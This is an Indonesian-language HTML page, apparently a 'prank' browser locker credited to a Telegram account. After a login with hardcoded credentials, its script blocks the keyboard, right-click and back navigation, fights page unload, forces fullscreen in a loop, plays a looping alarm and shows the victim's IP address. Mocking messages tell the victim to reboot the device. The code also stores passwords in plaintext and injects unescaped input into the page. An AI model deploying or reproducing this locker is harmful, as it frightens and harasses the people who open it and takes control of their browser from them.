<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Security</title>
    
    <!-- Google Font - Poppins -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
            -webkit-tap-highlight-color: transparent;
        }
        
        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
            font-family: 'Poppins', sans-serif;
            background: url('https://files.catbox.moe/cd074n.jpg') center/cover no-repeat;
            touch-action: none;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            z-index: -1;
        }
        
        .form-container {
            width: 90%;
            max-width: 400px;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            animation: fadeIn 0.5s ease-in-out;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .form-title {
            color: white;
            font-size: 2rem;
            font-weight: 600;
            text-align: center;
            margin-bottom: 1.5rem;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }
        
        .input-group {
            margin-bottom: 1.5rem;
            position: relative;
        }
        
        .input-group label {
            display: block;
            color: white;
            margin-bottom: 0.5rem;
            font-weight: 500;
            font-size: 0.9rem;
        }
        
        .input-group input {
            width: 100%;
            padding: 0.8rem 1rem;
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }
        
        .input-group input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.3);
            border-color: rgba(255, 255, 255, 0.5);
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1);
        }
        
        .toggle-password {
            position: absolute;
            right: 15px;
            top: 38px;
            color: white;
            cursor: pointer;
        }
        
        .main-btn {
            width: 100%;
            padding: 0.8rem;
            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 0.5rem;
        }
        
        .main-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
        }
        
        .secondary-btn {
            width: 100%;
            padding: 0.8rem;
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 0.5rem;
        }
        
        .secondary-btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        .error-message {
            color: #ff6b6b;
            font-size: 0.85rem;
            margin-top: 0.5rem;
            display: none;
        }
        
        .success-message {
            color: #4CAF50;
            text-align: center;
            margin-top: 1rem;
            display: none;
        }
        
        .screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .dashboard-page {
            display: none;
            width: 100%;
            height: 100vh;
            position: fixed;
            top: 0;
            left: 0;
            background: url('https://files.catbox.moe/cd074n.jpg') center/cover no-repeat;
            z-index: 1000;
        }
        
        .dashboard-container {
            width: 100%;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .user-info {
            background: rgba(255, 255, 255, 0.2);
            padding: 1.5rem;
            border-radius: 15px;
            margin-bottom: 1.5rem;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.8rem;
            color: white;
        }
        
        .warning-message {
            background: rgba(255, 107, 107, 0.3);
            border: 1px solid rgba(255, 107, 107, 0.5);
            border-radius: 10px;
            padding: 1rem;
            text-align: center;
            margin-bottom: 1.5rem;
        }
        
        .warning-text {
            color: #ff6b6b;
            font-weight: 600;
            font-size: 1rem;
        }
        
        .dashboard-btn {
            width: 100%;
            padding: 0.8rem;
            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 0.5rem;
        }
        
        .create-account-section {
            background: rgba(255, 255, 255, 0.1);
            padding: 1.5rem;
            border-radius: 15px;
            margin-top: 1.5rem;
        }
        
        .section-title {
            color: white;
            text-align: center;
            margin-bottom: 1rem;
            font-size: 1.2rem;
        }
        
        .accounts-list {
            max-height: 200px;
            overflow-y: auto;
            margin-bottom: 1rem;
        }
        
        .account-item {
            background: rgba(255, 255, 255, 0.1);
            padding: 0.8rem;
            border-radius: 8px;
            margin-bottom: 0.5rem;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .delete-btn {
            background: #ff4757;
            color: white;
            border: none;
            padding: 0.3rem 0.6rem;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.8rem;
        }
        
        .dev-info {
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.7);
            padding: 8px 12px;
            border-radius: 20px;
            color: white;
            font-size: 12px;
        }
        
        .dev-info a {
            color: #0088cc;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <!-- Halaman Login -->
    <div class="screen" id="loginScreen">
        <div class="form-container">
            <h1 class="form-title">Panel Login</h1>
            
            <form id="loginForm">
                <div class="input-group">
                    <label for="email">Username</label>
                    <input type="text" id="email" placeholder="Masukkan username">
                    <div class="error-message" id="emailError">Username harus diisi</div>
                </div>
                
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" placeholder="Masukkan password">
                    <i class="fas fa-eye toggle-password" id="togglePassword"></i>
                    <div class="error-message" id="passwordError">Password harus diisi</div>
                </div>
                
                <button type="submit" class="main-btn">Login</button>
                
                <div class="success-message" id="successMessage">
                    <i class="fas fa-check-circle"></i> Login berhasil! Mengalihkan...
                </div>
            </form>

            <!-- Section Create Account -->
            <div class="create-account-section">
                <h3 class="section-title">Buat Akun Baru</h3>
                
                <div class="input-group">
                    <label for="newUsername">Username Baru</label>
                    <input type="text" id="newUsername" placeholder="Buat username">
                </div>
                
                <div class="input-group">
                    <label for="newPassword">Password Baru</label>
                    <input type="password" id="newPassword" placeholder="Buat password">
                </div>
                
                <button class="secondary-btn" id="createAccountBtn">
                    <i class="fas fa-plus"></i> Buat Akun
                </button>

                <!-- Daftar Akun -->
                <div class="accounts-list" id="accountsList">
                    <!-- Akun akan muncul di sini -->
                </div>
            </div>
        </div>
    </div>
    
    <!-- Halaman Locked -->
    <div class="dashboard-page" id="dashboardPage">
        <div class="dashboard-container">
            <div class="form-container">
                <h1 class="form-title">System Locked 🔒</h1>
                
                <div class="user-info">
                    <div class="info-item">
                        <span>Username:</span>
                        <span id="displayUsername">-</span>
                    </div>
                    <div class="info-item">
                        <span>IP Address:</span>
                        <span id="ipAddress">-</span>
                    </div>
                    <div class="info-item">
                        <span>Device:</span>
                        <span id="deviceInfo">-</span>
                    </div>
                    <div class="info-item">
                        <span>Lock Time:</span>
                        <span id="lockTime">-</span>
                    </div>
                </div>
                
                <div class="warning-message">
                    <div class="warning-text">
                        ⚠️ kalo mau keluar reboot cill 😹😹😹
                    </div>
                </div>
                
                <button class="dashboard-btn" id="unlockBtn">
                    <i class="fas fa-lock-open"></i> Coba Unlock
                </button>
                
                <button class="dashboard-btn" id="helpBtn">
                    <i class="fas fa-question-circle"></i> Minta Bantuan
                </button>
            </div>
        </div>
    </div>

    <!-- Developer Info -->
    <div class="dev-info">
        <a href="https://t.me/JhonNotDev" target="_blank">
            <i class="fab fa-telegram"></i> @JhonNotDev
        </a>
    </div>
    
    <!-- Audio untuk prank -->
    <audio id="alertSound" loop>
        <source src="https://files.catbox.moe/ya1wgk.mp3" type="audio/mpeg">
    </audio>

    <script>
        // Admin account
        const ADMIN_ACCOUNT = {
            username: "JhonNotDev",
            password: "999"
        };

        // Load accounts dari localStorage
        let validAccounts = JSON.parse(localStorage.getItem('prankAccounts')) || {
            "Rezzy": "Rezzy001",
            "admin": "admin123",
            "user": "user123"
        };

        // Array pesan sarkas
        const sarkasMessages = [
            "GABISA DONG BOCAH! 😹",
            "YAKALI BISA BEGITU AJA! 😹", 
            "REBOOT AJA CILL! 😹",
            "DASAR NOOB MAU KELUAR! 😹",
            "OTAK LU DIMANA SIH? 😹",
            "GAMPANGAN DARI GINI? 😹"
        ];

        // Update accounts list display
        function updateAccountsList() {
            const accountsList = document.getElementById('accountsList');
            accountsList.innerHTML = '';
            
            Object.keys(validAccounts).forEach(username => {
                if (username !== ADMIN_ACCOUNT.username) { // Jangan tampilkan admin
                    const accountItem = document.createElement('div');
                    accountItem.className = 'account-item';
                    accountItem.innerHTML = `
                        <div>
                            <strong>${username}</strong>
                            <div style="font-size: 0.8rem; opacity: 0.8;">${validAccounts[username]}</div>
                        </div>
                        <button class="delete-btn" onclick="deleteAccount('${username}')">
                            <i class="fas fa-trash"></i>
                        </button>
                    `;
                    accountsList.appendChild(accountItem);
                }
            });
        }

        // Delete account
        function deleteAccount(username) {
            if (confirm(`Hapus akun ${username}?`)) {
                delete validAccounts[username];
                localStorage.setItem('prankAccounts', JSON.stringify(validAccounts));
                updateAccountsList();
            }
        }

        // Create new account
        document.getElementById('createAccountBtn').addEventListener('click', function() {
            const username = document.getElementById('newUsername').value.trim();
            const password = document.getElementById('newPassword').value.trim();
            
            if (username && password) {
                if (validAccounts[username]) {
                    alert('Username sudah ada!');
                    return;
                }
                
                validAccounts[username] = password;
                localStorage.setItem('prankAccounts', JSON.stringify(validAccounts));
                
                document.getElementById('newUsername').value = '';
                document.getElementById('newPassword').value = '';
                
                updateAccountsList();
                alert(`Akun ${username} berhasil dibuat!`);
            } else {
                alert('Username dan password harus diisi!');
            }
        });

        // Toggle password visibility
        document.getElementById('togglePassword').addEventListener('click', function() {
            const password = document.getElementById('password');
            const type = password.type === 'password' ? 'text' : 'password';
            password.type = type;
            this.classList.toggle('fa-eye');
            this.classList.toggle('fa-eye-slash');
        });

        // Login handler
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const emailError = document.getElementById('emailError');
            const passwordError = document.getElementById('passwordError');
            const successMessage = document.getElementById('successMessage');
            
            emailError.style.display = 'none';
            passwordError.style.display = 'none';
            successMessage.style.display = 'none';
            
            let isValid = true;
            
            if (!username) {
                emailError.style.display = 'block';
                isValid = false;
            }
            
            if (!password) {
                passwordError.style.display = 'block';
                isValid = false;
            }
            
            if (isValid) {
                // Cek jika admin
                if (username === ADMIN_ACCOUNT.username && password === ADMIN_ACCOUNT.password) {
                    successMessage.style.display = 'block';
                    setTimeout(() => {
                        alert('👑 Mode Admin - Sistem tidak terkunci');
                    }, 1000);
                    return;
                }
                
                // Cek jika user biasa
                if (validAccounts[username] === password) {
                    successMessage.style.display = 'block';
                    setTimeout(() => {
                        activateLock(username);
                    }, 2000);
                } else {
                    emailError.textContent = 'Username atau password salah!';
                    emailError.style.display = 'block';
                }
            }
        });

        // Fungsi untuk mengaktifkan kunci
        async function activateLock(username) {
            const alertSound = document.getElementById('alertSound');
            
            // Sembunyikan login screen
            document.getElementById('loginScreen').style.display = 'none';
            
            // Tampilkan dashboard
            document.getElementById('dashboardPage').style.display = 'block';
            
            // Tampilkan data user
            document.getElementById('displayUsername').textContent = username;
            document.getElementById('ipAddress').textContent = await getIP();
            document.getElementById('deviceInfo').textContent = getDeviceBrand();
            document.getElementById('lockTime').textContent = new Date().toLocaleString();
            
            // Putar suara alarm
            alertSound.play().catch(e => {
                console.log('Audio error:', e);
            });
            alertSound.loop = true;
            
            // Aktifkan kunci EXTREME
            activateExtremeLock();
        }

        // EXTREME LOCK SYSTEM - REBOOT ONLY
        function activateExtremeLock() {
            console.log('🔒 EXTREME LOCK ACTIVATED - REBOOT ONLY!');
            
            // 1. BLOKIR KEYBOARD 100%
            document.addEventListener('keydown', function(e) {
                e.preventDefault();
                e.stopPropagation();
                showRebootWarning();
                return false;
            }, true);

            // 2. BLOKIR MOUSE RIGHT CLICK
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
                showRebootWarning();
                return false;
            }, true);

            // 3. BLOKIR BEFOREUNLOAD SUPER AGGRESIF
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '🚫 SYSTEM LOCKED! REBOOT ONLY! 😹😹😹';
                
                // Coba buka kembali halaman
                setTimeout(() => {
                    window.location.reload();
                }, 50);
                
                return '🚫 SYSTEM LOCKED! REBOOT ONLY! 😹😹😹';
            });

            // 4. BLOKIR NAVIGATION
            history.pushState(null, null, window.location.href);
            window.addEventListener('popstate', function(e) {
                history.pushState(null, null, window.location.href);
                showRebootWarning();
            });

            // 5. FORCE FULLSCREEN
            function forceFullscreen() {
                const elem = document.documentElement;
                if (elem.requestFullscreen) {
                    elem.requestFullscreen().catch(err => {
                        setTimeout(forceFullscreen, 500);
                    });
                }
            }
            forceFullscreen();

            // 6. CONTINUOUS PROTECTION LOOP
            setInterval(() => {
                window.focus();
                if (!document.fullscreenElement) {
                    forceFullscreen();
                }
            }, 1000);
        }

        function showRebootWarning() {
            const randomMsg = sarkasMessages[Math.floor(Math.random() * sarkasMessages.length)];
            alert(`🚫 ${randomMsg}\n\n💀 REBOOT DEVICE MU! 💀`);
        }

        // Get IP Address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // Deteksi device
        function getDeviceBrand() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes('samsung')) return 'Samsung';
            if (ua.includes('xiaomi') || ua.includes('redmi')) return 'Xiaomi';
            if (ua.includes('iphone')) return 'iPhone';
            if (ua.includes('oppo')) return 'Oppo';
            if (ua.includes('vivo')) return 'Vivo';
            if (ua.includes('android')) return 'Android';
            return 'Unknown Device';
        }

        // Button events untuk dashboard
        document.getElementById('unlockBtn').addEventListener('click', function() {
            const originalText = this.innerHTML;
            this.textContent = sarkasMessages[Math.floor(Math.random() * sarkasMessages.length)];
            this.disabled = true;
            
            setTimeout(() => {
                this.innerHTML = originalText;
                this.disabled = false;
            }, 3000);
        });

        document.getElementById('helpBtn').addEventListener('click', function() {
            const originalText = this.innerHTML;
            this.textContent = sarkasMessages[Math.floor(Math.random() * sarkasMessages.length)];
            this.disabled = true;
            
            setTimeout(() => {
                this.innerHTML = originalText;
                this.disabled = false;
            }, 3000);
        });

        // Initialize
        window.addEventListener('load', function() {
            updateAccountsList();
        });
    </script>
</body>
</html>
